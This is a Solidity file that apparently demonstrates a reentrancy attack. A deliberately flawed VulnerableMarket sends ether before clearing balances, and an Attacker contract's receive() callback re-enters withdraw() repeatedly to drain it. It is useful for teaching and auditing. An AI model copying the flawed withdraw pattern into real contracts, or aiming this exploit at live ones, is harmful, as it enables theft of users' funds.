// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableMarket {
    mapping(address => uint256) public balances;

    event DepositRecorded(address indexed account, uint256 amount, uint256 newBalance);
    event WithdrawalStarted(address indexed account, uint256 amount);
    event ExternalCallBeforeStateUpdate(address indexed account, uint256 amount);
    event BalanceCleared(address indexed account);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit DepositRecorded(msg.sender, msg.value, balances[msg.sender]);
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Empty balance");
        emit WithdrawalStarted(msg.sender, bal);

        emit ExternalCallBeforeStateUpdate(msg.sender, bal);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Transfer failed");

        balances[msg.sender] = 0;
        emit BalanceCleared(msg.sender);
    }
}

contract Attacker {
    VulnerableMarket public market;
    uint256 public reentryCount;

    event AttackStarted(address indexed target, uint256 amount);
    event Reentered(uint256 indexed count, uint256 targetBalance);

    constructor(address _market) {
        market = VulnerableMarket(_market);
    }

    receive() external payable {
        if (address(market).balance >= 1 ether) {
            reentryCount += 1;
            emit Reentered(reentryCount, address(market).balance);
            market.withdraw();
        }
    }

    function attack() external payable {
        reentryCount = 0;
        emit AttackStarted(address(market), msg.value);
        market.deposit{value: 1 ether}();
        market.withdraw();
    }
}
